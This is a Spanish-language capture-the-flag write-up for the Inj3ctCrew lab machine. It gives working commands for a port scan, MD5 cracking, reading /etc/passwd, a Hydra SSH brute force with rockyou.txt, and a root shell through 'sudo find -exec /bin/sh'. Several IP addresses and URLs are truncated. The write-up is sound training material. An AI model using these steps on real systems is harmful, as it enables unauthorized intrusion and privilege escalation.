# Reporte de Auditoría de Seguridad: Máquina Inj3ctCrew

**Fecha:** 1 de julio de 2026  
**Dirección IP Objetivo:** `192.168.`  
**Dirección IP Atacante:** `192.168.`  
**Plataforma / Laboratorio:** TheHackersLabs  

---

## 1. Fase de Reconocimiento y Enumeración

### Escaneo de Puertos y Servicios (Nmap)
Se realizó un análisis de puertos sobre la dirección IP objetivo para identificar los servicios activos expuestos.

```bash
nmap -p22,80 -sCV 192.168.
```

**Resultado:**
*   **Puerto 22/tcp:** Abierto | `OpenSSH 9.6p1 Ubuntu 3ubuntu13.14` (Protocolo 2.0).
*   **Puerto 80/tcp:** Abierto | `Apache httpd 2.4.58 ((Ubuntu))`.

---

## 2. Fase de Enumeración Web

### Inspección del Código Fuente Inicial
Al acceder a la raíz del servidor web (`http://192.168.0`) se observó la página por defecto de Apache. Tras revisar el código fuente de la página (`Ctrl + U`), se detectó un comentario oculto que contenía una cadena codificada en **Base64**:

```text
RWwgZGlyZWN0b3JpbyBkZSByZXNwYWxkbyBmdWUgY8y1zZvNisyQzJjMpsyYb8y1zYbNnc2EzZbNk8yYbcy0zJXNkMy
```

Se procedió a decodificar la cadena utilizando la terminal de Kali Linux:
```bash
echo "RWwgZGlyZWN0b3JpbyBkZSByZXNwYWxkbyBmdWUgY8y1zZvNisyQzJjMpsyYb8y1zYbNnc2EzZbNk8yYbcy0zJXNkMy" | base64 -d
```
**Resultado:** `El directorio de respaldo fue comprometido`

### Fuzzing y Descubrimiento de Directorios (Web)
Se ejecutó un ataque de diccionario (*Fuzzing*) para listar rutas ocultas en el servidor web, identificando los siguientes recursos activos:

*   `/index.html` (Status: 200)
*   `/login.php` (Status: 200)
*   `/backup.php` (Status: 200) - *Archivo crítico identificado*

### Análisis de `/backup.php` y Exfiltración de Credenciales
1. Al navegar hacia `http://192.168backup.php`, se visualizó una interfaz que confirmaba de manera explícita que las copias de seguridad de la plataforma habían sido comprometidas.
2. Al inspeccionar nuevamente el código fuente HTML de este recurso, se halló el siguiente comentario crítico dejado por un grupo de actores maliciosos:
   ```html
   <!-- Nosotros Inj3ctCrew, te hemos dejado una informacion importante en el directorio PwnedCredentials.html -->
   ```
3. Se navegó hacia la ruta descubierta: `http://192.168PwnedCredentials.html`, extrayendo una credencial comprometida:
   * **Usuario:** `Admin`
   * **Hash (MD5):** `d8578edf8458ce06fbc5bb76a58c5ca4`

### Craqueo del Hash
Se sometió la firma MD5 a un proceso de descifrado (*cracking*) por fuerza bruta o base de datos de colisiones:
* **Fórmula:** `MD5(qwerty) = d8578edf8458ce06fbc5bb76a58c5ca4`
* **Contraseña en texto claro:** `qwerty`
<img width="1920" height="934" alt="hash" src="https://github.com/user-attachments/assets/2ebf1a28-d8c8-4c13-9595-01c72ce449d3" />

---

## 3. Acceso Inicial e Identificación de Usuarios

### Panel de Administración Web (`/login.php`)
Se ingresaron las credenciales obtenidas (`Admin` : `qwerty`) dentro del formulario de inicio de sesión de `/login.php`. Tras autenticarse correctamente, el panel web permitió interactuar con funciones del sistema operativo. 

A través de una vulnerabilidad de ejecución remota de comandos o lectura de archivos locales (LFI), se listó la base de datos de usuarios del sistema:

```bash
cat /etc/passwd
```
**Hallazgo:** Se identificó la existencia de una cuenta de usuario real en el sistema llamada **`nolen11`**.

---

## 4. Intrusión y Obtención de Shell (Fuerza Bruta SSH)

Con el nombre de usuario válido (`nolen11`), se procedió a realizar un ataque de fuerza bruta cruzado dirigido al servicio SSH (puerto 22) utilizando la suite **Hydra** y el diccionario clásico `rockyou.txt`.

```bash
hydra -l nolen11 -P /usr/share/wordlists/rockyou.txt ssh://192.168
```

**Resultado del ataque:**
```text
[22][ssh] host: 192.168  login: nolen11   password: 987654321
1 of 1 target successfully completed, 1 valid password found
```

### Establecimiento de la Conexión SSH
Se utilizó la contraseña descubierta (`987654321`) para iniciar una sesión de terminal interactiva segura:

```bash
ssh nolen11@192.168
```

Al acceder al directorio personal del usuario se leyeron las flags iniciales:
```bash
nolen11@TheHackersLabs-Inj3ctCrew:~$ cat user.txt
# Flag de Usuario: 19238cf8ad4a6b9ea83fae24cf5c739c
```

---

## 5. Escalada de Privilegios (De `nolen11` a `root`)

Se listaron las capacidades de ejecución del usuario actual con permisos de superusuario:

```bash
nolen11@TheHackersLabs-Inj3ctCrew:~$ sudo -l
```

**Configuración vulnerable detectada:**
```text
User nolen11 may run the following commands on TheHackersLabs-Inj3ctCrew:
    (ALL) NOPASSWD: /usr/bin/find
```

El usuario `nolen11` tiene la facultad de ejecutar el binario `/usr/bin/find` con los máximos privilegios de administración (`ALL`) sin proporcionar ninguna contraseña (`NOPASSWD`).

### Explotación de GTFOBins (`find`)
Aprovechando la capacidad de ejecutar comandos internos del sistema que posee el parámetro `-exec` en `find`, se forzó la apertura de una terminal Bourne Shell (`sh`) como superusuario:

```bash
sudo /usr/bin/find . -exec /bin/sh \; -quit
```

### Confirmación y Lectura de Flag de Root
El prompt del sistema cambió instantáneamente al símbolo de numeral (`#`), validando la obtención de acceso root. Se procedió a leer la flag definitiva en el directorio del administrador:

```bash
# id
uid=0(root) gid=0(root) groups=0(root)

# cd /root
# cat root.txt
```

```text
############################################
#                                          # 
#  ¡FELICITACIONES!                        #
#                                          # 
#   Has logrado escalar privilegios y      #
#   obtener acceso root en la maquina      #
#   Inj3ctCrew.                            #
#                                          #
#   A seguir aprendiendo con mas maquinas  #
#   y practicando.                         #        
#                                          #
############################################
```

¡Máquina **Inj3ctCrew** completamente vulnerada y comprometida con éxito! 🏁
